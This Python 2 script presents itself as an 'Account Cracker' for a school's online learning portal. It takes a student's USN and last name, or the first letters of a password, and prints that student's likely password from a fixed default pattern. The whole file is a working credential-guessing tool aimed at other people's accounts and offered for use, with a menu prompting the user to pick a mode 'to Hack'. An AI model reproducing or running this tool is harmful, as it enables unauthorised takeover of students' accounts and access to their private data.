import os,time
W = '\033[1;37;40m'
Br = '\033[1;31;40m'
Bg = '\033[1;32;40m'
Y = '\033[1;33;40m'
Bb = '\033[1;34;40m'
Bm = '\033[1;35;40m'
Bc = '\033[1;36;40m'

#color selection
def color():
	c = raw_input(W +' Activate Color mode? [yes or no]: ')
	if c == 'yes' or c == 'Yes' or c == 'YES':
		print 'activated'
		time.sleep(2.0)
		os.system('python2 amacolor.py')
	elif c == 'no' or c == 'No' or c == 'NO':
		print 'deactivated'
		time.sleep(2.)
		a()
	else:
		print ' invalid command'
		color()
	
b = "*"

q = "-" * 60
w = "                Kto12.amauonline Acount Cracker \n"
e = "                        Created by:  \n"
t = "                    Edmark Jay Sumampen \n"
y = "                         11-22-17 \n"
r = '\n'

v = "*" * 60
v1 = '\n1) Fast mode interface\n'
v2 = '2) Prediction mode interface\n'
ab = '3) About\n'
ex = '4) Exit\n'
v3 = "*" * 60

def a():
	os.system('clear')
	os.system('cat logo')
	print v + v1 + v2 + ab + ex + v3
	k = raw_input('\n Select 1 or 2 Mode of Interface to Hack: ')
	if k == '1':
		os.system('clear')
		nd2()
		
	elif k == '2':
		os.system('clear')
		acc()
		
	elif k == '3':
		os.system('clear')
		os.system('python2 about.py')
	elif k == '4':
		print ' Bye Bye'
		time.sleep(2.0)
		exit()
	else:
		print " Invalid command! "
		time.sleep(2.0)
		os.system('clear')
		a()

def acc():
	os.system('clear')
	os.system('cat logo')
	print ' Prediction Interface'
	print q + w + e + t + y + q + r
	u = raw_input(' Enter USN: ')
	p = raw_input(' Enter Target Last name: ')
	
	print '\n'
	print p + ' Account Information:'
	print "=" * 60
	print " User: " + u
	print " Password: " + b + p[0] + b + u [8] + u [9] + u [10] + u [1] + u [2] + u [3]
	print "=" * 60
	print main()

def nd2():
	os.system('clear')
	os.system('cat logo')
	print ' Fast mode Interface'
	print q + w + e + t + y + q + r
	u = raw_input(' Enter USN: ')
	p = raw_input(' Enter 3 first letter of Password: ')
	
	print '\n'
	print ' Results:'
	print "=" * 60
	print " User: " + u
	print " Password: " + p + u [8] + u [9] + u [10] + u [1] + u [2] + u [3]
	print "=" * 60
	print main()

def main():
	
	o = raw_input('\n Just Type "home" to retun in Menu: ')
	if o == 'home' or o == 'Home':
		os.system('clear')
		a()
	elif o == 'clear':
		os.system('clear')
		main()
	else:
		print " idiot wrong command!"
		os.system('clear')
		main()


			
#color selection
color()

#no color if No
a()
acc()
nd2()
start()
a()

